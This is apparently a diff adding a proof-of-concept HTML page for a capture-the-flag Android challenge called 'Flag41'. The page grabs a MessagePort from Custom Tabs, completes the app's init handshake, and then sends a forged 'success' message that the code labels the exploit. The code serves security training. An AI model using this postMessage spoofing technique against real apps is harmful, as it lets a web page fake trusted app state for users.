@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag41 PostMessage PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background:#111; color:white; font-family:Arial; padding:20px; }
+        button { padding:12px 20px; font-size:18px; border-radius:8px; }
+    </style>
+</head>
+
+<body>
+    <h2>Flag41 PoC</h2>
+
+    <button id="sync" disabled>Waiting for Port…</button>
+
+    <div id="log" style="margin-top:20px; font-size:14px;"></div>
+
+<script>
+    let port = null;
+    const logContainer = document.getElementById("log");
+    const syncBtn = document.getElementById("sync");
+
+    function log(txt) {
+        const div = document.createElement("div");
+        div.textContent = txt;
+        logContainer.appendChild(div);
+    }
+
+    // Receive the MessagePort from Custom Tabs
+    window.addEventListener("message", (event) => {
+        if (!event.ports || event.ports.length === 0) return;
+
+        port = event.ports[0];
+        log("[web] Port received");
+
+        // Setup messages coming FROM Android app
+        port.onmessage = (event) => {
+            log("[app → web] " + event.data);
+
+            // If Android app sent "init", we respond
+            if (event.data === "init") {
+                log("[web] Sending init_complete");
+                port.postMessage(JSON.stringify({ message: "init_complete" }));
+
+                // Enable sync button
+                syncBtn.disabled = false;
+            }
+        };
+    });
+
+    // Clicking sync sends the exploit message
+    syncBtn.onclick = () => {
+        const successPayload = JSON.stringify({ message: "success" });
+        log("[web] Sending success → " + successPayload);
+        port.postMessage(successPayload);
+    };
+</script>
+</body>
+</html>
